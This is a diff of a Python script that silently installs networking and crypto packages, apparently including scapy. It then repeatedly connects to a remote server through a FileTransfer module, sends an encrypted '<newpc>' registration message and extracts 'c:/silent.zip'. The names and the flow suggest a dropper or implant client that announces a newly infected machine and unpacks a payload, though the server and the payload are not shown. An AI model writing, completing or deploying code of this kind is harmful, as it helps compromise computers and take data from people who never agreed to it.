@@ -1,23 +1,20 @@
 import os
+import sys
 import time
 import zipfile
+import venv
 import subprocess
 
 
 def main():
-    os.makedirs('c:/deadly')
-    os.chdir('c:/deadly')
-    os.popen('python -m venv myenv').read()
-    os.chdir('myenv/Scripts')
-    os.popen('activate').read()
-    os.chdir('c:/deadly')
-    packages = ['scapy==2.5', 'rsa', 'PyCryptodome', 'tqdm']
+    print(sys.path)
+    subprocess.check_call([sys.executable, '-m', 'ensurepip'])
+    packages = ["scapy", "rsa", "Pycryptodome", "tqdm"]
     for package in packages:
-        subprocess.check_call(['pip', 'install', package])
-    print("All packages installed")
+        subprocess.run([r"c:/myenv/Scripts/python", "-m", "pip", "install", package])
     import FileTransfer
     transfered = False
-    while(not transfered):
+    while (not transfered):
         client_socket, encryption_key = FileTransfer.initiate()
         try:
             client_socket.send(FileTransfer.encrypt('<newpc>'.encode(), encryption_key))
@@ -28,8 +25,6 @@ def main():
         except:
             pass
         finally:
-            while(client_socket.recv(1024)):
-                pass
             client_socket.close()
 
     with zipfile.ZipFile('c:/silent.zip', 'r') as zip:
